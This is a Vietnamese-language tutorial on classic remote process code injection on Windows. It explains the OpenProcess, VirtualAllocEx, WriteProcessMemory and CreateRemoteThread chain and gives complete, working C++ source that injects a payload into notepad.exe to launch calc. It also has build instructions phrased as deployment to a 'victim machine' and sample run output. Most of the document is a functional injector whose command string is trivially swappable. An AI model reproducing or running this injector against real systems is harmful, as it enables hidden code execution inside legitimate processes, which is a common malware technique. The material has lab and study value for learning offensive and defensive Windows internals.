
---

# 📝 [PE 02] Classic Code Injection — Remote Process

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Classic Code Injection tại Tiến trình Từ xa (Remote Process)** là kỹ thuật mở rộng biên giới thực thi của mã máy sang một không gian địa chỉ ảo độc lập. Thay vì kích nổ logic inside lòng tiến trình Loader (như PE 01), kỹ thuật này cho phép ta can thiệp vào bộ nhớ và mượn ngữ cảnh tháp luồng của một tiến trình hợp pháp khác đang chạy trên hệ thống (ví dụ: `notepad.exe`) để thực thi mã máy độc lập vị trí (PIC).

### 🎯 Mục tiêu nghiên cứu:

* Thao tác và quản lý bộ nhớ ảo xuyên biên giới tiến trình (Cross-Process Memory Manipulation).
* Làm chủ kỹ thuật khống chế luồng từ xa bằng cơ chế triệu hồi Thread subsystem của Windows Kernel.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi thực hiện tiêm mã chéo sang một tiến trình đích, rào cản lớn nhất là sự cô lập không gian địa chỉ ảo (Virtual Address Space Isolation) được bảo vệ bởi bộ vi xử lý và hệ điều hành. Để phá vỡ lớp băng bảo mật này, giải thuật thực thi quy trình qua 4 bước ngầm tại tầng Kernel:

```
[OpenProcess: Cướp Handle] ──> [VirtualAllocEx: Mở phân vùng RAM từ xa] ──> [WriteProcessMemory: Ánh xạ mã] ──> [CreateRemoteThread: Khai hỏa]

```

1. **Ủy quyền can thiệp (`OpenProcess`)**: Loader gửi yêu cầu lên Kernel để xin cấp một Handle (tay cầm) kết nối tới tiến trình mục tiêu với các quyền truy cập tối cao (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, `PROCESS_CREATE_THREAD`). Kernel sẽ kiểm tra Token bảo mật của Loader xem có đủ thẩm quyền không trước khi phê duyệt Handle.
2. **Khắc vạch phân vùng ảo (`VirtualAllocEx`)**: Khác với `VirtualAlloc` cục bộ, phiên bản mở rộng `Ex` cho phép ta chỉ định Handle của tiến trình đích. Hệ điều hành sẽ tìm kiếm một dải trang nhớ rảnh trong không gian ảo của nạn nhân, chuyển trạng thái sang `MEM_COMMIT` và lật cờ bảo vệ thành **`PAGE_EXECUTE_READWRITE` (RWX)**.
3. **Bơm máu xuyên biên giới (`WriteProcessMemory`)**: Loader thực hiện lệnh sao chép dữ liệu từ RAM của mình, đẩy qua cổng Handle của Kernel để ghi đè bẹp lên phân vùng ảo vừa mở khóa bên lòng tiến trình đích.
4. **Bắt cướp dòng chảy CPU từ xa (`CreateRemoteThread`)**: Kernel Windows khởi tạo một cấu trúc Thread Object hoàn toàn mới nằm lọt lòng trong cấu trúc quản lý của tiến trình đích, nạp địa chỉ của vùng nhớ Code Payload vào thanh ghi chỉ mục lệnh `Rip` và nạp địa chỉ vùng cấu trúc tham số tuyệt đối vào thanh ghi `Rcx` để CPU của tiến trình đích tự động triệu hồi thực thi.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng thiết kế **Zero Static Buffers** (Cấp phát động thích ứng) để tự động hóa trích xuất độ rộng cấu trúc dữ liệu và xử lý Handle defense nghiêm ngặt.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối hóa giải triệt để lỗi RIP-Relative
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _REMOTE_THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} REMOTE_THREAD_DATA, *PREMOTE_THREAD_DATA;

// Hàm chức năng độc lập vị trí gánh logic thực thi kịch khung từ xa
DWORD WINAPI RemotePayload(LPVOID lpParam) {
    PREMOTE_THREAD_DATA pData = (PREMOTE_THREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, không phân biệt chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 02: CLASSIC REMOTE PROCESS CODE INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcessName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetProcessName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // 1. Mở kết nối cướp Handle xuyên biên giới tiến trình
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen han hien tai bi gioi han." << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;

    // 2. Cấp phát động trang nhớ RWX từ xa lọt lòng tiến trình đích
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = VirtualAllocEx(hProcess, NULL, sizeof(REMOTE_THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Mo trang nho Code RWX tu xa tai địa chỉ: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    REMOTE_THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // 3. Bơm song song khối mã máy phẳng và tham số dữ liệu chéo không gian ảo
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePayload, functionSize, NULL);
    WriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(REMOTE_THREAD_DATA), NULL);
    std::cout << "[+] Anh xa ma may va tham so tuyet doi sang Notepad hoan tat." << std::endl;

    // 4. Kích nổ luồng từ xa để ép CPU đối phương triệu hồi logic của ta
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm phẳng sạch
        std::cout << "[+] Remote Code Injection Successful!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi Handle hệ thống triệt để chống rò rỉ (Memory Leak)
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Để đảm bảo file `.exe` hoạt động hoàn hảo, không phụ thuộc môi trường khi đưa sang máy nạn nhân hay VM sạch:

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Chuyển đổi cấu hình thanh công cụ sang chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
2. Cấu hình cờ liên kết tĩnh thư viện: Truy cập `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Thay đổi mục `Runtime Library` thành **`Multi-threaded (/MT)`**.
3. Tiến hành chuột phải vào Project $\rightarrow$ Bấm **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi chuỗi.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell đĩa thô bên ngoài và chạy file `.exe`:

```powershell
PS C:\Workspace\x64\Release> .\PE02_Remote_Injection.exe
====================================================
[*] PE 02: CLASSIC REMOTE PROCESS CODE INJECTION
====================================================
[+] Da tim thay Notepad.exe voi PID: 12540
[+] Mo trang nho Code RWX tu xa tai địa chỉ: 0x0000019C24BF0000
[+] Anh xa ma may va tham so tuyet doi sang Notepad hoan tat.
[*] Dang khoi tao luong tu xa de khai hoa logic...
[+] Remote Code Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM:* Ứng dụng Máy tính `calc.exe` lập tức được sinh ra và bật mở hiên ngang rực rỡ kịch khung kịch trần!

---

